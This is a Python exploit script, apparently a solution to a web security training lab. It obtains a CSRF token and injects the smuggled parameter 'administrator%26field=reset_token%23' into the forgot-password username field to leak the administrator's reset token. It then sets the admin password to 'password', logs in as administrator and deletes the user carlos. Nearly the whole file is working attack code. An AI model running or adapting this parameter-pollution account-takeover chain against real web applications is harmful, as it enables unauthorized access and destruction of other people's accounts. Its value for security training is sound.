import requests
import sys
from bs4 import BeautifulSoup
import json



#user_agents = [
#    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
#    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
#    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
#    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
#]

#random_user_agent = random.choice(user_agents)
#headers = {'User-Agent': random_user_agent}


# Check url
def check_url(base_url):
    if base_url.endswith('/'):
        base_url = base_url[:-1]
        return base_url
    else:
        return base_url



# Get CSRF-Token
def get_csrf_token(url, session):

        print("> Getting CSRF-Token ...")

        response = session.get(url)

        if response.status_code == 200:

            soup = BeautifulSoup(response.text, "html.parser")
            result_value = soup.find("input", {"name": "csrf"})

            if result_value:
                csrf_token = result_value["value"]
                print("CSRF token : " + csrf_token)
                return csrf_token

            else:
                print("[!] CSRF token not found!")
                print(response.text)
                sys.exit(1)
            
        else:
            print("Web Request Error.")
            sys.exit(1)


# Get password reset token
def get_pwd_reset_token(forget_password_url, csrf_token, session):

    #data = "csrf=" + csrf_token + "&username=administrator" + "%26" + "field=reset_token%23"

    payload = 'administrator%26field=reset_token%23'

    data = {
        'csrf': csrf_token,
        'username': payload
    }

    print(data)

    response = session.post(forget_password_url, data=data)

    if response.status_code == 200:
        json_response = json.loads(response.text)
        print(json_response)
        reset_token = json_response['result']
        print("Password reset token : " + reset_token)
        return reset_token

    else:
        print("Get password reset token error.")
        print(response.text)
        sys.exit(1)

# Reset Password
def reset_password(forget_password_url, csrf_token, reset_token, session):
    
    csrf_token = get_csrf_token(forget_password_url, session)

    #data = "csrf=" + csrf_token + "&reset_token=" + reset_token + "&new-password-1=" + "password" + "&new-password-2=" + "password" 
    data = {
        'csrf': csrf_token,
        'reset_token': reset_token,
        'new-password-1': 'password',
        'new-password-2': 'password'
    }
    print(data)

    response = session.post(forget_password_url + "?reset_token=" + reset_token, data = data)

    #print(response.text)

# Login Admin Portal
def admin_login(base_url, csrf_token, session):

    login_url = base_url + "/login"

    data = {
        'csrf': csrf_token,
        'username': 'administrator',
        'password': 'password'
    }

    response = session.post(login_url, data = data)

    if response.status_code == 200:
        return session



# Delet User Carlos
def delete_carlos(base_url, session):

    response = session.get(base_url + "/admin/delete?username=carlos", allow_redirects=False)

    print(response.status_code)
    print(response.text)


# Session Start
session = requests.Session()


args = sys.argv[1:]

base_url = args[0]

base_url = check_url(base_url)

forget_password_url = base_url + "/forgot-password"

csrf_token = get_csrf_token(forget_password_url, session)

reset_token = get_pwd_reset_token(forget_password_url, csrf_token, session)

reset_password(forget_password_url, csrf_token, reset_token, session)

admin_login(base_url, csrf_token, session)

delete_carlos(base_url, session)


